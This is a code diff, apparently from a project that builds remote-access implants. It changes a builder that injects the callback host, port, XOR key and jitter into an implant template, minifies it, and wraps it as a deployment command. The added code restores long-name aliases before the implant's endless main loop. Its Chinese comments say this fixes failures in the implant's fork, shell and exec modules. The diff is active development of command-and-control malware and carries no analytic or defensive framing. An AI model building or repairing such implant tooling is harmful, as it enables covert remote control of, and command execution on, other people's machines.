@@ -28,6 +28,22 @@ _CONFIG_PATH = os.path.join(_SERVER_DIR, "config.json")
 _DEFAULT_OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "output")
 
+# minify 后的短名 → 长名别名(植入模块代码按原名访问模板全局,压缩后
+# 只剩短名;在进入主循环前补回别名,一行解决 fork/shell/exec 等模块
+# 在压缩版植入物上的 NameError,2026-08-27 修复)。
+# 注意:必须插在 minify 结果的主循环(最后一个 while True:)之前——
+# 主循环永不退出,插在后面永远不会执行。
+_ALIAS_LINE = ("js=g;tm=f;sec=l;thr=t2;io_=k;tb=j;rnd=e;hl=h;hmac_=hm;sy=i;"
+               "send_frame=p;recv_frame=q;sleep_jitter=s\n")
+
+
+def _insert_aliases(code: str) -> str:
+    """把长名别名行插入到主循环之前。"""
+    idx = code.rfind("while True:")
+    if idx == -1:
+        return code + "\n" + _ALIAS_LINE
+    return code[:idx] + _ALIAS_LINE + code[idx:]
+
 
 def _read_implant_key() -> bytes:
     """从 server/config.json 读取 implant_key（build 自动读取，T6.1）。"""
@@ -86,6 +102,7 @@ def run(host, port, key_hex=None, interval=60, jitter=0.2, out_dir=None):
     rendered = rendered.replace("{{JITTER}}", str(jitter))
     rendered = rendered.replace("{{XOR_KEY_BYTES}}", str(list(key)))
     rendered = minify(rendered)  # 可读源码 → 短名产物（D2 契约构建期压缩）
+    rendered = _insert_aliases(rendered)  # 补回模块依赖的长名别名（主循环前）
 
     command = deploy_command(rendered)  # 部署壳用随机单字节 k，与通信密钥无关
 
